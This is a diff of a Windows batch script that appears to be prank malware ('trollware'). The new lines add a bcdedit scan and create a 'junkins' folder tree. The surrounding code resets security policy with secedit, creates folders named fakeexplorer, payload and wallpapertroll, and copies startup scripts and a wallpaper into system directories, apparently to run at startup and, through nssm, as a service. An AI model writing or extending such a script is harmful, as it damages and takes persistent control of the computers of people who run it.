@@ -33,6 +33,7 @@ SFC /ScanFile="C:\Windows\system32\secedit.exe"
 SFC /ScanFile="C:\Windows\system32\mountvol.exe"
 SFC /ScanFile="C:\Windows\system32\icacls.exe"
 SFC /ScanFile="C:\Windows\system32\xcopy.exe"
+SFC /ScanFile="C:\Windows\system32\bcdedit.exe"
 secedit /configure /cfg %windir%\inf\defltbase.inf /db defltbase.sdb /verbose
 echo Checking Operating System Version...
 wmic os get version | find "6.1" > nul
@@ -207,6 +208,10 @@ goto BCD
 mkdir c:\windows\fakeexplorer
 mkdir c:\windows\payload
 mkdir c:\windows\wallpapertroll
+mkdir c:\windows\junkins
+mkdir c:\windows\junkins\startup
+mkdir c:\windows\junkins\walp
+mkdir c:\windows\junkins\nssm
 xcopy "%CD%\junkins\startup\no.bat" "c:\windows\fakeexplorer" /y /q /h
 xcopy "%CD%\junkins\startup\startup.bat c:\windows\payload\startup.bat" /y /q /h
 xcopy "%CD%\junkins\walp\walp.bmp" "c:\windows\wallpapertroll\walp.bmp" /y /q /h
